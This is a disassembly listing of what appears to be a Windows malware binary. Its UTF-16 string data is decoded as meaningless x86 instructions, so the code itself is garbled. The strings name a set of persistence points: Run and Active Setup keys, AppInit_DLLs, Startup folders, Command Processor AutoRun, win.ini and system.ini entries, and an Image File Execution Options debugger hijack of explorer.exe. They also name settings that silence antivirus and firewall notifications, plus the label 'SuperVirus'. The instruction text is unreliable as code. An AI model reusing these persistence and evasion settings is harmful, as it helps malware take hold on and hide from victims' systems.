  406845:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40684b:	6f                   	outsl  %ds:(%esi),(%dx)
  40684c:	00 77 00             	add    %dh,0x0(%edi)
  40684f:	73 00                	jae    0x406851
  406851:	5c                   	pop    %esp
  406852:	00 43 00             	add    %al,0x0(%ebx)
  406855:	75 00                	jne    0x406857
  406857:	72 00                	jb     0x406859
  406859:	72 00                	jb     0x40685b
  40685b:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40685f:	74 00                	je     0x406861
  406861:	56                   	push   %esi
  406862:	00 65 00             	add    %ah,0x0(%ebp)
  406865:	72 00                	jb     0x406867
  406867:	73 00                	jae    0x406869
  406869:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40686f:	5c                   	pop    %esp
  406870:	00 50 00             	add    %dl,0x0(%eax)
  406873:	6f                   	outsl  %ds:(%esi),(%dx)
  406874:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  406878:	00 63 00             	add    %ah,0x0(%ebx)
  40687b:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  406881:	5c                   	pop    %esp
  406882:	00 45 00             	add    %al,0x0(%ebp)
  406885:	78 00                	js     0x406887
  406887:	70 00                	jo     0x406889
  406889:	6c                   	insb   (%dx),%es:(%edi)
  40688a:	00 6f 00             	add    %ch,0x0(%edi)
  40688d:	72 00                	jb     0x40688f
  40688f:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  406893:	5c                   	pop    %esp
  406894:	00 52 00             	add    %dl,0x0(%edx)
  406897:	75 00                	jne    0x406899
  406899:	6e                   	outsb  %ds:(%esi),(%dx)
  40689a:	00 00                	add    %al,(%eax)
  40689c:	03 31                	add    (%ecx),%esi
  40689e:	00 00                	add    %al,(%eax)
  4068a0:	03 42 00             	add    0x0(%edx),%eax
  4068a3:	00 6b 53             	add    %ch,0x53(%ebx)
  4068a6:	00 4f 00             	add    %cl,0x0(%edi)
  4068a9:	46                   	inc    %esi
  4068aa:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  4068ae:	00 41 00             	add    %al,0x0(%ecx)
  4068b1:	52                   	push   %edx
  4068b2:	00 45 00             	add    %al,0x0(%ebp)
  4068b5:	5c                   	pop    %esp
  4068b6:	00 4d 00             	add    %cl,0x0(%ebp)
  4068b9:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  4068bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4068c0:	00 73 00             	add    %dh,0x0(%ebx)
  4068c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4068c4:	00 66 00             	add    %ah,0x0(%esi)
  4068c7:	74 00                	je     0x4068c9
  4068c9:	5c                   	pop    %esp
  4068ca:	00 41 00             	add    %al,0x0(%ecx)
  4068cd:	63 00                	arpl   %eax,(%eax)
  4068cf:	74 00                	je     0x4068d1
  4068d1:	69 00 76 00 65 00    	imul   $0x650076,(%eax),%eax
  4068d7:	20 00                	and    %al,(%eax)
  4068d9:	53                   	push   %ebx
  4068da:	00 65 00             	add    %ah,0x0(%ebp)
  4068dd:	74 00                	je     0x4068df
  4068df:	75 00                	jne    0x4068e1
  4068e1:	70 00                	jo     0x4068e3
  4068e3:	5c                   	pop    %esp
  4068e4:	00 49 00             	add    %cl,0x0(%ecx)
  4068e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4068e8:	00 73 00             	add    %dh,0x0(%ebx)
  4068eb:	74 00                	je     0x4068ed
  4068ed:	61                   	popa
  4068ee:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  4068f2:	00 65 00             	add    %ah,0x0(%ebp)
  4068f5:	64 00 20             	add    %ah,%fs:(%eax)
  4068f8:	00 43 00             	add    %al,0x0(%ebx)
  4068fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4068fc:	00 6d 00             	add    %ch,0x0(%ebp)
  4068ff:	70 00                	jo     0x406901
  406901:	6f                   	outsl  %ds:(%esi),(%dx)
  406902:	00 6e 00             	add    %ch,0x0(%esi)
  406905:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  406909:	74 00                	je     0x40690b
  40690b:	73 00                	jae    0x40690d
  40690d:	5c                   	pop    %esp
  40690e:	00 00                	add    %al,(%eax)
  406910:	11 53 00             	adc    %edx,0x0(%ebx)
  406913:	74 00                	je     0x406915
  406915:	75 00                	jne    0x406917
  406917:	62 00                	bound  %eax,(%eax)
  406919:	50                   	push   %eax
  40691a:	00 61 00             	add    %ah,0x0(%ecx)
  40691d:	74 00                	je     0x40691f
  40691f:	68 00 00 0f 56       	push   $0x560f0000
  406924:	00 65 00             	add    %ah,0x0(%ebp)
  406927:	72 00                	jb     0x406929
  406929:	73 00                	jae    0x40692b
  40692b:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  406931:	00 0f                	add    %cl,(%edi)
  406933:	31 00                	xor    %eax,(%eax)
  406935:	2c 00                	sub    $0x0,%al
  406937:	30 00                	xor    %al,(%eax)
  406939:	2c 00                	sub    $0x0,%al
  40693b:	30 00                	xor    %al,(%eax)
  40693d:	2c 00                	sub    $0x0,%al
  40693f:	30 00                	xor    %al,(%eax)
  406941:	00 69 53             	add    %ch,0x53(%ecx)
  406944:	00 4f 00             	add    %cl,0x0(%edi)
  406947:	46                   	inc    %esi
  406948:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  40694c:	00 41 00             	add    %al,0x0(%ecx)
  40694f:	52                   	push   %edx
  406950:	00 45 00             	add    %al,0x0(%ebp)
  406953:	5c                   	pop    %esp
  406954:	00 4d 00             	add    %cl,0x0(%ebp)
  406957:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  40695d:	6f                   	outsl  %ds:(%esi),(%dx)
  40695e:	00 73 00             	add    %dh,0x0(%ebx)
  406961:	6f                   	outsl  %ds:(%esi),(%dx)
  406962:	00 66 00             	add    %ah,0x0(%esi)
  406965:	74 00                	je     0x406967
  406967:	5c                   	pop    %esp
  406968:	00 57 00             	add    %dl,0x0(%edi)
  40696b:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  406971:	6f                   	outsl  %ds:(%esi),(%dx)
  406972:	00 77 00             	add    %dh,0x0(%edi)
  406975:	73 00                	jae    0x406977
  406977:	20 00                	and    %al,(%eax)
  406979:	4e                   	dec    %esi
  40697a:	00 54 00 5c          	add    %dl,0x5c(%eax,%eax,1)
  40697e:	00 43 00             	add    %al,0x0(%ebx)
  406981:	75 00                	jne    0x406983
  406983:	72 00                	jb     0x406985
  406985:	72 00                	jb     0x406987
  406987:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40698b:	74 00                	je     0x40698d
  40698d:	56                   	push   %esi
  40698e:	00 65 00             	add    %ah,0x0(%ebp)
  406991:	72 00                	jb     0x406993
  406993:	73 00                	jae    0x406995
  406995:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40699b:	5c                   	pop    %esp
  40699c:	00 57 00             	add    %dl,0x0(%edi)
  40699f:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  4069a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4069a6:	00 77 00             	add    %dh,0x0(%edi)
  4069a9:	73 00                	jae    0x4069ab
  4069ab:	00 19                	add    %bl,(%ecx)
  4069ad:	41                   	inc    %ecx
  4069ae:	00 70 00             	add    %dh,0x0(%eax)
  4069b1:	70 00                	jo     0x4069b3
  4069b3:	49                   	dec    %ecx
  4069b4:	00 6e 00             	add    %ch,0x0(%esi)
  4069b7:	69 00 74 00 5f 00    	imul   $0x5f0074,(%eax),%eax
  4069bd:	44                   	inc    %esp
  4069be:	00 4c 00 4c          	add    %cl,0x4c(%eax,%eax,1)
  4069c2:	00 73 00             	add    %dh,0x0(%ebx)
  4069c5:	00 21                	add    %ah,(%ecx)
  4069c7:	4c                   	dec    %esp
  4069c8:	00 6f 00             	add    %ch,0x0(%edi)
  4069cb:	61                   	popa
  4069cc:	00 64 00 41          	add    %ah,0x41(%eax,%eax,1)
  4069d0:	00 70 00             	add    %dh,0x0(%eax)
  4069d3:	70 00                	jo     0x4069d5
  4069d5:	49                   	dec    %ecx
  4069d6:	00 6e 00             	add    %ch,0x0(%esi)
  4069d9:	69 00 74 00 5f 00    	imul   $0x5f0074,(%eax),%eax
  4069df:	44                   	inc    %esp
  4069e0:	00 4c 00 4c          	add    %cl,0x4c(%eax,%eax,1)
  4069e4:	00 73 00             	add    %dh,0x0(%ebx)
  4069e7:	00 79 43             	add    %bh,0x43(%ecx)
  4069ea:	00 3a                	add    %bh,(%edx)
  4069ec:	00 5c 00 50          	add    %bl,0x50(%eax,%eax,1)
  4069f0:	00 72 00             	add    %dh,0x0(%edx)
  4069f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4069f4:	00 67 00             	add    %ah,0x0(%edi)
  4069f7:	72 00                	jb     0x4069f9
  4069f9:	61                   	popa
  4069fa:	00 6d 00             	add    %ch,0x0(%ebp)
  4069fd:	44                   	inc    %esp
  4069fe:	00 61 00             	add    %ah,0x0(%ecx)
  406a01:	74 00                	je     0x406a03
  406a03:	61                   	popa
  406a04:	00 5c 00 4d          	add    %bl,0x4d(%eax,%eax,1)
  406a08:	00 69 00             	add    %ch,0x0(%ecx)
  406a0b:	63 00                	arpl   %eax,(%eax)
  406a0d:	72 00                	jb     0x406a0f
  406a0f:	6f                   	outsl  %ds:(%esi),(%dx)
  406a10:	00 73 00             	add    %dh,0x0(%ebx)
  406a13:	6f                   	outsl  %ds:(%esi),(%dx)
  406a14:	00 66 00             	add    %ah,0x0(%esi)
  406a17:	74 00                	je     0x406a19
  406a19:	5c                   	pop    %esp
  406a1a:	00 57 00             	add    %dl,0x0(%edi)
  406a1d:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  406a23:	6f                   	outsl  %ds:(%esi),(%dx)
  406a24:	00 77 00             	add    %dh,0x0(%edi)
  406a27:	73 00                	jae    0x406a29
  406a29:	5c                   	pop    %esp
  406a2a:	00 53 00             	add    %dl,0x0(%ebx)
  406a2d:	74 00                	je     0x406a2f
  406a2f:	61                   	popa
  406a30:	00 72 00             	add    %dh,0x0(%edx)
  406a33:	74 00                	je     0x406a35
  406a35:	20 00                	and    %al,(%eax)
  406a37:	4d                   	dec    %ebp
  406a38:	00 65 00             	add    %ah,0x0(%ebp)
  406a3b:	6e                   	outsb  %ds:(%esi),(%dx)
  406a3c:	00 75 00             	add    %dh,0x0(%ebp)
  406a3f:	5c                   	pop    %esp
  406a40:	00 50 00             	add    %dl,0x0(%eax)
  406a43:	72 00                	jb     0x406a45
  406a45:	6f                   	outsl  %ds:(%esi),(%dx)
  406a46:	00 67 00             	add    %ah,0x0(%edi)
  406a49:	72 00                	jb     0x406a4b
  406a4b:	61                   	popa
  406a4c:	00 6d 00             	add    %ch,0x0(%ebp)
  406a4f:	73 00                	jae    0x406a51
  406a51:	5c                   	pop    %esp
  406a52:	00 53 00             	add    %dl,0x0(%ebx)
  406a55:	74 00                	je     0x406a57
  406a57:	61                   	popa
  406a58:	00 72 00             	add    %dh,0x0(%edx)
  406a5b:	74 00                	je     0x406a5d
  406a5d:	75 00                	jne    0x406a5f
  406a5f:	70 00                	jo     0x406a61
  406a61:	00 7d 5c             	add    %bh,0x5c(%ebp)
  406a64:	00 41 00             	add    %al,0x0(%ecx)
  406a67:	70 00                	jo     0x406a69
  406a69:	70 00                	jo     0x406a6b
  406a6b:	44                   	inc    %esp
  406a6c:	00 61 00             	add    %ah,0x0(%ecx)
  406a6f:	74 00                	je     0x406a71
  406a71:	61                   	popa
  406a72:	00 5c 00 52          	add    %bl,0x52(%eax,%eax,1)
  406a76:	00 6f 00             	add    %ch,0x0(%edi)
  406a79:	61                   	popa
  406a7a:	00 6d 00             	add    %ch,0x0(%ebp)
  406a7d:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  406a83:	5c                   	pop    %esp
  406a84:	00 4d 00             	add    %cl,0x0(%ebp)
  406a87:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  406a8d:	6f                   	outsl  %ds:(%esi),(%dx)
  406a8e:	00 73 00             	add    %dh,0x0(%ebx)
  406a91:	6f                   	outsl  %ds:(%esi),(%dx)
  406a92:	00 66 00             	add    %ah,0x0(%esi)
  406a95:	74 00                	je     0x406a97
  406a97:	5c                   	pop    %esp
  406a98:	00 57 00             	add    %dl,0x0(%edi)
  406a9b:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  406aa1:	6f                   	outsl  %ds:(%esi),(%dx)
  406aa2:	00 77 00             	add    %dh,0x0(%edi)
  406aa5:	73 00                	jae    0x406aa7
  406aa7:	5c                   	pop    %esp
  406aa8:	00 53 00             	add    %dl,0x0(%ebx)
  406aab:	74 00                	je     0x406aad
  406aad:	61                   	popa
  406aae:	00 72 00             	add    %dh,0x0(%edx)
  406ab1:	74 00                	je     0x406ab3
  406ab3:	20 00                	and    %al,(%eax)
  406ab5:	4d                   	dec    %ebp
  406ab6:	00 65 00             	add    %ah,0x0(%ebp)
  406ab9:	6e                   	outsb  %ds:(%esi),(%dx)
  406aba:	00 75 00             	add    %dh,0x0(%ebp)
  406abd:	5c                   	pop    %esp
  406abe:	00 50 00             	add    %dl,0x0(%eax)
  406ac1:	72 00                	jb     0x406ac3
  406ac3:	6f                   	outsl  %ds:(%esi),(%dx)
  406ac4:	00 67 00             	add    %ah,0x0(%edi)
  406ac7:	72 00                	jb     0x406ac9
  406ac9:	61                   	popa
  406aca:	00 6d 00             	add    %ch,0x0(%ebp)
  406acd:	73 00                	jae    0x406acf
  406acf:	5c                   	pop    %esp
  406ad0:	00 53 00             	add    %dl,0x0(%ebx)
  406ad3:	74 00                	je     0x406ad5
  406ad5:	61                   	popa
  406ad6:	00 72 00             	add    %dh,0x0(%edx)
  406ad9:	74 00                	je     0x406adb
  406adb:	75 00                	jne    0x406add
  406add:	70 00                	jo     0x406adf
  406adf:	00 49 53             	add    %cl,0x53(%ecx)
  406ae2:	00 4f 00             	add    %cl,0x0(%edi)
  406ae5:	46                   	inc    %esi
  406ae6:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  406aea:	00 41 00             	add    %al,0x0(%ecx)
  406aed:	52                   	push   %edx
  406aee:	00 45 00             	add    %al,0x0(%ebp)
  406af1:	5c                   	pop    %esp
  406af2:	00 4d 00             	add    %cl,0x0(%ebp)
  406af5:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  406afb:	6f                   	outsl  %ds:(%esi),(%dx)
  406afc:	00 73 00             	add    %dh,0x0(%ebx)
  406aff:	6f                   	outsl  %ds:(%esi),(%dx)
  406b00:	00 66 00             	add    %ah,0x0(%esi)
  406b03:	74 00                	je     0x406b05
  406b05:	5c                   	pop    %esp
  406b06:	00 43 00             	add    %al,0x0(%ebx)
  406b09:	6f                   	outsl  %ds:(%esi),(%dx)
  406b0a:	00 6d 00             	add    %ch,0x0(%ebp)
  406b0d:	6d                   	insl   (%dx),%es:(%edi)
  406b0e:	00 61 00             	add    %ah,0x0(%ecx)
  406b11:	6e                   	outsb  %ds:(%esi),(%dx)
  406b12:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  406b16:	00 50 00             	add    %dl,0x0(%eax)
  406b19:	72 00                	jb     0x406b1b
  406b1b:	6f                   	outsl  %ds:(%esi),(%dx)
  406b1c:	00 63 00             	add    %ah,0x0(%ebx)
  406b1f:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  406b23:	73 00                	jae    0x406b25
  406b25:	6f                   	outsl  %ds:(%esi),(%dx)
  406b26:	00 72 00             	add    %dh,0x0(%edx)
  406b29:	00 0f                	add    %cl,(%edi)
  406b2b:	41                   	inc    %ecx
  406b2c:	00 75 00             	add    %dh,0x0(%ebp)
  406b2f:	74 00                	je     0x406b31
  406b31:	6f                   	outsl  %ds:(%esi),(%dx)
  406b32:	00 52 00             	add    %dl,0x0(%edx)
  406b35:	75 00                	jne    0x406b37
  406b37:	6e                   	outsb  %ds:(%esi),(%dx)
  406b38:	00 00                	add    %al,(%eax)
  406b3a:	0f 77                	emms
  406b3c:	00 69 00             	add    %ch,0x0(%ecx)
  406b3f:	6e                   	outsb  %ds:(%esi),(%dx)
  406b40:	00 2e                	add    %ch,(%esi)
  406b42:	00 69 00             	add    %ch,0x0(%ecx)
  406b45:	6e                   	outsb  %ds:(%esi),(%dx)
  406b46:	00 69 00             	add    %ch,0x0(%ecx)
  406b49:	00 25 0d 00 0a 00    	add    %ah,0xa000d
  406b4f:	5b                   	pop    %ebx
  406b50:	00 77 00             	add    %dh,0x0(%edi)
  406b53:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  406b59:	6f                   	outsl  %ds:(%esi),(%dx)
  406b5a:	00 77 00             	add    %dh,0x0(%edi)
  406b5d:	73 00                	jae    0x406b5f
  406b5f:	5d                   	pop    %ebp
  406b60:	00 0d 00 0a 00 6c    	add    %cl,0x6c000a00
  406b66:	00 6f 00             	add    %ch,0x0(%edi)
  406b69:	61                   	popa
  406b6a:	00 64 00 3d          	add    %ah,0x3d(%eax,%eax,1)
  406b6e:	00 00                	add    %al,(%eax)
  406b70:	0d 0d 00 0a 00       	or     $0xa000d,%eax
  406b75:	72 00                	jb     0x406b77
  406b77:	75 00                	jne    0x406b79
  406b79:	6e                   	outsb  %ds:(%esi),(%dx)
  406b7a:	00 3d 00 00 05 0d    	add    %bh,0xd050000
  406b80:	00 0a                	add    %cl,(%edx)
  406b82:	00 00                	add    %al,(%eax)
  406b84:	15 73 00 79 00       	adc    $0x790073,%eax
  406b89:	73 00                	jae    0x406b8b
  406b8b:	74 00                	je     0x406b8d
  406b8d:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  406b91:	2e 00 69 00          	add    %ch,%cs:0x0(%ecx)
  406b95:	6e                   	outsb  %ds:(%esi),(%dx)
  406b96:	00 69 00             	add    %ch,0x0(%ecx)
  406b99:	00 27                	add    %ah,(%edi)
  406b9b:	0d 00 0a 00 5b       	or     $0x5b000a00,%eax
  406ba0:	00 33                	add    %dh,(%ebx)
  406ba2:	00 38                	add    %bh,(%eax)
  406ba4:	00 36                	add    %dh,(%esi)
  406ba6:	00 45 00             	add    %al,0x0(%ebp)
  406ba9:	6e                   	outsb  %ds:(%esi),(%dx)
  406baa:	00 68 00             	add    %ch,0x0(%eax)
  406bad:	5d                   	pop    %ebp
  406bae:	00 0d 00 0a 00 64    	add    %cl,0x64000a00
  406bb4:	00 65 00             	add    %ah,0x0(%ebp)
  406bb7:	76 00                	jbe    0x406bb9
  406bb9:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  406bbf:	3d 00 00 11 62       	cmp    $0x62110000,%eax
  406bc4:	00 6f 00             	add    %ch,0x0(%edi)
  406bc7:	6f                   	outsl  %ds:(%esi),(%dx)
  406bc8:	00 74 00 2e          	add    %dh,0x2e(%eax,%eax,1)
  406bcc:	00 69 00             	add    %ch,0x0(%ecx)
  406bcf:	6e                   	outsb  %ds:(%esi),(%dx)
  406bd0:	00 69 00             	add    %ch,0x0(%ecx)
  406bd3:	00 1b                	add    %bl,(%ebx)
  406bd5:	3d 00 53 00 75       	cmp    $0x75005300,%eax
  406bda:	00 70 00             	add    %dh,0x0(%eax)
  406bdd:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  406be1:	56                   	push   %esi
  406be2:	00 69 00             	add    %ch,0x0(%ecx)
  406be5:	72 00                	jb     0x406be7
  406be7:	75 00                	jne    0x406be9
  406be9:	73 00                	jae    0x406beb
  406beb:	0d 00 0a 00 00       	or     $0xa00,%eax
  406bf0:	80 ad 53 00 4f 00 46 	subb   $0x46,0x4f0053(%ebp)
  406bf7:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  406bfb:	00 41 00             	add    %al,0x0(%ecx)
  406bfe:	52                   	push   %edx
  406bff:	00 45 00             	add    %al,0x0(%ebp)
  406c02:	5c                   	pop    %esp
  406c03:	00 4d 00             	add    %cl,0x0(%ebp)
  406c06:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  406c0c:	6f                   	outsl  %ds:(%esi),(%dx)
  406c0d:	00 73 00             	add    %dh,0x0(%ebx)
  406c10:	6f                   	outsl  %ds:(%esi),(%dx)
  406c11:	00 66 00             	add    %ah,0x0(%esi)
  406c14:	74 00                	je     0x406c16
  406c16:	5c                   	pop    %esp
  406c17:	00 57 00             	add    %dl,0x0(%edi)
  406c1a:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  406c20:	6f                   	outsl  %ds:(%esi),(%dx)
  406c21:	00 77 00             	add    %dh,0x0(%edi)
  406c24:	73 00                	jae    0x406c26
  406c26:	20 00                	and    %al,(%eax)
  406c28:	4e                   	dec    %esi
  406c29:	00 54 00 5c          	add    %dl,0x5c(%eax,%eax,1)
  406c2d:	00 43 00             	add    %al,0x0(%ebx)
  406c30:	75 00                	jne    0x406c32
  406c32:	72 00                	jb     0x406c34
  406c34:	72 00                	jb     0x406c36
  406c36:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  406c3a:	74 00                	je     0x406c3c
  406c3c:	56                   	push   %esi
  406c3d:	00 65 00             	add    %ah,0x0(%ebp)
  406c40:	72 00                	jb     0x406c42
  406c42:	73 00                	jae    0x406c44
  406c44:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  406c4a:	5c                   	pop    %esp
  406c4b:	00 49 00             	add    %cl,0x0(%ecx)
  406c4e:	6d                   	insl   (%dx),%es:(%edi)
  406c4f:	00 61 00             	add    %ah,0x0(%ecx)
  406c52:	67 00 65 00          	add    %ah,0x0(%di)
  406c56:	20 00                	and    %al,(%eax)
  406c58:	46                   	inc    %esi
  406c59:	00 69 00             	add    %ch,0x0(%ecx)
  406c5c:	6c                   	insb   (%dx),%es:(%edi)
  406c5d:	00 65 00             	add    %ah,0x0(%ebp)
  406c60:	20 00                	and    %al,(%eax)
  406c62:	45                   	inc    %ebp
  406c63:	00 78 00             	add    %bh,0x0(%eax)
  406c66:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  406c6a:	75 00                	jne    0x406c6c
  406c6c:	74 00                	je     0x406c6e
  406c6e:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  406c74:	20 00                	and    %al,(%eax)
  406c76:	4f                   	dec    %edi
  406c77:	00 70 00             	add    %dh,0x0(%eax)
  406c7a:	74 00                	je     0x406c7c
  406c7c:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  406c82:	73 00                	jae    0x406c84
  406c84:	5c                   	pop    %esp
  406c85:	00 65 00             	add    %ah,0x0(%ebp)
  406c88:	78 00                	js     0x406c8a
  406c8a:	70 00                	jo     0x406c8c
  406c8c:	6c                   	insb   (%dx),%es:(%edi)
  406c8d:	00 6f 00             	add    %ch,0x0(%edi)
  406c90:	72 00                	jb     0x406c92
  406c92:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  406c96:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  406c9a:	78 00                	js     0x406c9c
  406c9c:	65 00 00             	add    %al,%gs:(%eax)
  406c9f:	11 44 00 65          	adc    %eax,0x65(%eax,%eax,1)
  406ca3:	00 62 00             	add    %ah,0x0(%edx)
  406ca6:	75 00                	jne    0x406ca8
  406ca8:	67 00 67 00          	add    %ah,0x0(%bx)
  406cac:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  406cb0:	00 80 8b 53 00 4f    	add    %al,0x4f00538b(%eax)
  406cb6:	00 46 00             	add    %al,0x0(%esi)
  406cb9:	54                   	push   %esp
  406cba:	00 57 00             	add    %dl,0x0(%edi)
  406cbd:	41                   	inc    %ecx
  406cbe:	00 52 00             	add    %dl,0x0(%edx)
  406cc1:	45                   	inc    %ebp
  406cc2:	00 5c 00 4d          	add    %bl,0x4d(%eax,%eax,1)
  406cc6:	00 69 00             	add    %ch,0x0(%ecx)
  406cc9:	63 00                	arpl   %eax,(%eax)
  406ccb:	72 00                	jb     0x406ccd
  406ccd:	6f                   	outsl  %ds:(%esi),(%dx)
  406cce:	00 73 00             	add    %dh,0x0(%ebx)
  406cd1:	6f                   	outsl  %ds:(%esi),(%dx)
  406cd2:	00 66 00             	add    %ah,0x0(%esi)
  406cd5:	74 00                	je     0x406cd7
  406cd7:	5c                   	pop    %esp
  406cd8:	00 57 00             	add    %dl,0x0(%edi)
  406cdb:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  406ce1:	6f                   	outsl  %ds:(%esi),(%dx)
  406ce2:	00 77 00             	add    %dh,0x0(%edi)
  406ce5:	73 00                	jae    0x406ce7
  406ce7:	5c                   	pop    %esp
  406ce8:	00 43 00             	add    %al,0x0(%ebx)
  406ceb:	75 00                	jne    0x406ced
  406ced:	72 00                	jb     0x406cef
  406cef:	72 00                	jb     0x406cf1
  406cf1:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  406cf5:	74 00                	je     0x406cf7
  406cf7:	56                   	push   %esi
  406cf8:	00 65 00             	add    %ah,0x0(%ebp)
  406cfb:	72 00                	jb     0x406cfd
  406cfd:	73 00                	jae    0x406cff
  406cff:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  406d05:	5c                   	pop    %esp
  406d06:	00 45 00             	add    %al,0x0(%ebp)
  406d09:	78 00                	js     0x406d0b
  406d0b:	70 00                	jo     0x406d0d
  406d0d:	6c                   	insb   (%dx),%es:(%edi)
  406d0e:	00 6f 00             	add    %ch,0x0(%edi)
  406d11:	72 00                	jb     0x406d13
  406d13:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  406d17:	5c                   	pop    %esp
  406d18:	00 55 00             	add    %dl,0x0(%ebp)
  406d1b:	73 00                	jae    0x406d1d
  406d1d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  406d21:	20 00                	and    %al,(%eax)
  406d23:	53                   	push   %ebx
  406d24:	00 68 00             	add    %ch,0x0(%eax)
  406d27:	65 00 6c 00 6c       	add    %ch,%gs:0x6c(%eax,%eax,1)
  406d2c:	00 20                	add    %ah,(%eax)
  406d2e:	00 46 00             	add    %al,0x0(%esi)
  406d31:	6f                   	outsl  %ds:(%esi),(%dx)
  406d32:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
  406d36:	00 65 00             	add    %ah,0x0(%ebp)
  406d39:	72 00                	jb     0x406d3b
  406d3b:	73 00                	jae    0x406d3d
  406d3d:	00 45 53             	add    %al,0x53(%ebp)
  406d40:	00 4f 00             	add    %cl,0x0(%edi)
  406d43:	46                   	inc    %esi
  406d44:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  406d48:	00 41 00             	add    %al,0x0(%ecx)
  406d4b:	52                   	push   %edx
  406d4c:	00 45 00             	add    %al,0x0(%ebp)
  406d4f:	5c                   	pop    %esp
  406d50:	00 4d 00             	add    %cl,0x0(%ebp)
  406d53:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  406d59:	6f                   	outsl  %ds:(%esi),(%dx)
  406d5a:	00 73 00             	add    %dh,0x0(%ebx)
  406d5d:	6f                   	outsl  %ds:(%esi),(%dx)
  406d5e:	00 66 00             	add    %ah,0x0(%esi)
  406d61:	74 00                	je     0x406d63
  406d63:	5c                   	pop    %esp
  406d64:	00 53 00             	add    %dl,0x0(%ebx)
  406d67:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  406d6b:	75 00                	jne    0x406d6d
  406d6d:	72 00                	jb     0x406d6f
  406d6f:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  406d75:	20 00                	and    %al,(%eax)
  406d77:	43                   	inc    %ebx
  406d78:	00 65 00             	add    %ah,0x0(%ebp)
  406d7b:	6e                   	outsb  %ds:(%esi),(%dx)
  406d7c:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  406d80:	00 72 00             	add    %dh,0x0(%edx)
  406d83:	00 2d 41 00 6e 00    	add    %ch,0x6e0041
  406d89:	74 00                	je     0x406d8b
  406d8b:	69 00 56 00 69 00    	imul   $0x690056,(%eax),%eax
  406d91:	72 00                	jb     0x406d93
  406d93:	75 00                	jne    0x406d95
  406d95:	73 00                	jae    0x406d97
  406d97:	44                   	inc    %esp
  406d98:	00 69 00             	add    %ch,0x0(%ecx)
  406d9b:	73 00                	jae    0x406d9d
  406d9d:	61                   	popa
  406d9e:	00 62 00             	add    %ah,0x0(%edx)
  406da1:	6c                   	insb   (%dx),%es:(%edi)
  406da2:	00 65 00             	add    %ah,0x0(%ebp)
  406da5:	4e                   	dec    %esi
  406da6:	00 6f 00             	add    %ch,0x0(%edi)
  406da9:	74 00                	je     0x406dab
  406dab:	69 00 66 00 79 00    	imul   $0x790066,(%eax),%eax
  406db1:	00 2b                	add    %ch,(%ebx)
  406db3:	46                   	inc    %esi
  406db4:	00 69 00             	add    %ch,0x0(%ecx)
  406db7:	72 00                	jb     0x406db9
  406db9:	65 00 77 00          	add    %dh,%gs:0x0(%edi)
  406dbd:	61                   	popa
  406dbe:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  406dc2:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  406dc6:	00 73 00             	add    %dh,0x0(%ebx)
  406dc9:	61                   	popa
  406dca:	00 62 00             	add    %ah,0x0(%edx)
  406dcd:	6c                   	insb   (%dx),%es:(%edi)
  406dce:	00 65 00             	add    %ah,0x0(%ebp)
  406dd1:	4e                   	dec    %esi
  406dd2:	00 6f 00             	add    %ch,0x0(%edi)
  406dd5:	74 00                	je     0x406dd7
  406dd7:	69 00 66 00 79 00    	imul   $0x790066,(%eax),%eax
